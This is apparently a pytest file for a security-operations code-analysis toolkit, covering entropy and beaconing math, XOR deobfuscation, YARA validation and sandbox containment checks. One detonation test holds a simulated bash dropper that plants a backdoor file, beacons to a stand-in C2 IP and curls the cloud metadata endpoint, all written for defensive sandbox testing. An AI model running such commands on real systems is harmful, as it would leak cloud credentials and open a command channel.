"""
Unit tests for Vertex AI Code Execution Sandbox and CodeExecutorFactory.
Follows strict Test-Driven Development (TDD).
"""

import math
import os
import pytest
from google.adk.agents import Agent
from google.adk.code_executors import (
    BaseCodeExecutor,
    BuiltInCodeExecutor,
    UnsafeLocalCodeExecutor,
    VertexAiCodeExecutor,
    AgentEngineSandboxCodeExecutor,
)
from google.adk.code_executors.code_execution_utils import (
    CodeExecutionInput,
    CodeExecutionResult,
)

from installation_scripts.code_executor_factory import (
    calculate_beaconing_jitter,
    calculate_shannon_entropy,
    deobfuscate_xor_strings,
    detonate_and_capture_forensics,
    extract_payload_strings,
    get_code_executor,
    validate_and_test_yara_rule,
    verify_sandbox_containment,
)


class TestCodeExecutorFactory:
    """Tests for CodeExecutorFactory resolution and instantiation."""

    def test_factory_resolves_local_executor(self):
        executor = get_code_executor("local")
        assert isinstance(executor, UnsafeLocalCodeExecutor)

    def test_factory_resolves_builtin_executor(self):
        executor = get_code_executor("builtin")
        assert isinstance(executor, BuiltInCodeExecutor)

    def test_factory_resolves_agent_engine_sandbox(self):
        res_name = "projects/test-proj/locations/us-central1/reasoningEngines/123"
        executor = get_code_executor(
            "agent_engine", agent_engine_resource_name=res_name
        )
        assert isinstance(executor, AgentEngineSandboxCodeExecutor)
        assert executor.agent_engine_resource_name == res_name

    def test_factory_resolves_vertex_ai_extension(self):
        from installation_scripts.code_executor_factory import LazyVertexAiCodeExecutor
        executor = get_code_executor("vertex_ai")
        assert isinstance(executor, (VertexAiCodeExecutor, LazyVertexAiCodeExecutor))
        assert isinstance(executor, BaseCodeExecutor)

    def test_factory_auto_mode_fallback(self, monkeypatch):
        monkeypatch.delenv("AGENT_ENGINE_RESOURCE_NAME", raising=False)
        monkeypatch.delenv("SANDBOX_RESOURCE_NAME", raising=False)
        executor = get_code_executor("auto")
        assert isinstance(executor, (BuiltInCodeExecutor, AgentEngineSandboxCodeExecutor))


class TestSocCodeAnalysisAgent:
    """Tests for standalone test agent equipped with Code Execution."""

    def test_agent_initialization(self):
        from test_agents.soc_code_analysis_agent.agent import root_agent

        assert isinstance(root_agent, Agent)
        assert root_agent.name == "soc_code_analysis_agent"
        assert hasattr(root_agent, "code_executor")
        assert root_agent.code_executor is not None
        assert "threat" in root_agent.instruction.lower() or "analytics" in root_agent.instruction.lower()


class TestSecurityAnalyticsMath:
    """Tests for security analytics calculations supported by Code Execution."""

    def test_shannon_entropy_calculation(self):
        # Benign structured domain: low entropy
        benign_entropy = calculate_shannon_entropy("google.com")
        # High entropy DGA domain: high entropy
        dga_entropy = calculate_shannon_entropy("xk92bvf0q81lzmn04.evil-c2.net")
        
        assert benign_entropy < 3.5
        assert dga_entropy > 3.8

    def test_beaconing_jitter_calculation(self):
        # Strict periodic beaconing: 60s +/- 1s interval (low standard deviation)
        periodic_timestamps = [
            "2026-08-31T12:00:00Z",
            "2026-08-31T12:01:00Z",
            "2026-08-31T12:02:01Z",
            "2026-08-31T12:03:00Z",
            "2026-08-31T12:04:02Z",
        ]
        stats = calculate_beaconing_jitter(periodic_timestamps)
        assert stats["is_periodic"] is True
        assert stats["mean_interval_seconds"] == pytest.approx(60.5, abs=1.0)
        assert stats["coefficient_of_variation"] < 0.1

    def test_extract_payload_strings(self):
        # Buffer with interspersed binary bytes and ASCII/UTF16 strings
        raw_buffer = b"\x00\x01\x02evil_binary.exe\x00\xff\xfeh\x00t\x00t\x00p\x00:\x00/\x00/\x00c\x002\x00\x00\x00"
        extracted = extract_payload_strings(raw_buffer, min_length=4)
        assert "evil_binary.exe" in extracted
        assert "http://c2" in extracted

    def test_deobfuscate_xor_strings(self):
        secret_url = b"https://apt29-c2.evil-domain.com/beacon"
        xor_key = 0x5A
        obfuscated_bytes = bytes([b ^ xor_key for b in secret_url])

        results = deobfuscate_xor_strings(obfuscated_bytes)
        assert len(results) > 0
        best_candidate = results[0]
        assert best_candidate["key"] == 0x5A
        assert "https://apt29-c2.evil-domain.com/beacon" in best_candidate["decoded_strings"]

    def test_validate_and_test_yara_rule_success(self):
        rule_text = """
        rule APT29_Beacon_Indicator {
            meta:
                author = "Threat Hunter Specialist"
                description = "Detects APT29 beacon string"
            strings:
                $beacon = "apt29-c2.evil-domain.com"
            condition:
                $beacon
        }
        """
        target_payload = b"\x90\x90Payload header with https://apt29-c2.evil-domain.com/beacon active\x00"
        verification = validate_and_test_yara_rule(rule_text, target_payload)
        assert verification["valid"] is True
        assert verification["matches"] is True
        assert "APT29_Beacon_Indicator" in verification["matched_rules"]

    def test_validate_and_test_yara_rule_syntax_error(self):
        broken_rule = "rule Broken_Rule { strings: $a = 123 condition: non_existent_token }"
        verification = validate_and_test_yara_rule(broken_rule, b"test")
        assert verification["valid"] is False
        assert "error" in verification

    def test_deobfuscate_xor_large_buffer_preview(self):
        # 100KB buffer with null-terminated payload at the beginning
        secret_url = b"https://apt29-c2.evil-domain.com/beacon\x00"
        xor_key = 0x5A
        obfuscated_prefix = bytes([b ^ xor_key for b in secret_url])
        # Null-padding in cleartext is 0x5A in raw obfuscated bytes
        large_payload = obfuscated_prefix + (b"\x5A" * 100_000)

        results = deobfuscate_xor_strings(large_payload, max_preview_bytes=4096)
        assert len(results) > 0
        best_candidate = results[0]
        assert best_candidate["key"] == 0x5A
        assert "https://apt29-c2.evil-domain.com/beacon" in best_candidate["decoded_strings"]

    def test_detonate_and_capture_forensics_bash_dropper(self, tmp_path):
        simulated_dropper = """#!/bin/bash
mkdir -p subfolder
echo "MALICIOUS_STAGER_PAYLOAD" > subfolder/backdoor.sh
echo "RANSOMWARE_ENCRYPTED_USER_DATA" > user_files.lock
echo "Attempting C2 connection..."
curl -s --connect-timeout 1 http://198.51.100.1/beacon || echo "C2_BEACON_BLOCKED"
echo "Attempting metadata theft..."
curl -s --connect-timeout 1 http://169.254.169.254/computeMetadata/v1/ || echo "METADATA_ACCESS_BLOCKED"
"""
        report = detonate_and_capture_forensics(
            simulated_dropper,
            payload_type="bash",
            timeout_sec=10,
            custom_workdir=str(tmp_path),
        )
        assert report["execution_success"] is True
        assert report["dropped_files_count"] >= 2

        dropped_filenames = [a["filename"] for a in report["dropped_artifacts"]]
        assert any("backdoor.sh" in fn for fn in dropped_filenames)
        assert any("user_files.lock" in fn for fn in dropped_filenames)

        # Confirm artifact hashes are valid 64-char SHA256 hex strings
        for artifact in report["dropped_artifacts"]:
            assert len(artifact["sha256"]) == 64
            assert int(artifact["sha256"], 16) > 0

    def test_verify_sandbox_containment_audit(self, monkeypatch):
        monkeypatch.setenv("CHRONICLE_SERVICE_ACCOUNT_PATH", "/path/to/key.json")
        monkeypatch.setenv("GTI_API_KEY", "real-super-secret-key-12345")

        # When forbidden keys are present in host env (use test metadata IP that cannot be reached)
        audit = verify_sandbox_containment(metadata_ip="192.0.2.1")
        assert audit["metadata_shielded"] is True
        assert audit["egress_denied"] is True
        assert audit["env_credentials_shielded"] is False
        assert "GTI_API_KEY" in audit["leaked_keys"]

        # When running in clean isolated environment
        monkeypatch.delenv("CHRONICLE_SERVICE_ACCOUNT_PATH", raising=False)
        monkeypatch.delenv("GTI_API_KEY", raising=False)
        clean_audit = verify_sandbox_containment(
            metadata_ip="192.0.2.1",
            forbidden_env_keys=["NON_EXISTENT_KEY"],
        )
        assert clean_audit["env_credentials_shielded"] is True
        assert clean_audit["is_sandboxed"] is True
        assert "ZERO-TRUST" in clean_audit["verdict"]

